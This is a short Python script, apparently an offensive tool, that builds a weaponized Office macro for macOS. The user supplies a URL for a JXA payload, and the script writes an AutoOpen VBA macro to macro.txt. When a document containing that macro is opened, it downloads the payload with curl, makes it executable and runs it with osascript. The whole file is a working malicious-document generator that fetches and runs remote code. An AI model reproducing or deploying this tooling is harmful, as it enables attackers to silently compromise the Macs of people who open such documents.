import optparse
from optparse import OptionParser
import sys

if ((len(sys.argv) < 3 or len(sys.argv) > 3) and '-h' not in sys.argv):
    print("Usage: %s -u <JXA_payload_url>" % sys.argv[0])
    sys.exit(1)

parser = OptionParser()
parser.add_option("-u", "--jxaurl", help="JXA payload url")
(options, args) = parser.parse_args()

url = options.jxaurl.strip()

macrofile = open('macro.txt', 'w')
macrofile.write('Sub AutoOpen()\n')
macrofile.write("MacScript(\"do shell script \"\"curl %s -o app.js\"\" \")"%url)
macrofile.write("\n")
macrofile.write("MacScript(\"do shell script \"\"chmod +x app.js\"\"\")")
macrofile.write("\n")
macrofile.write("MacScript(\"do shell script \"\"osascript app.js &\"\"\")")
macrofile.write("\n")
macrofile.write("End Sub")

print("-"*100)
print("Macro was written to macro.txt in the current working directory")
print("DONE!")
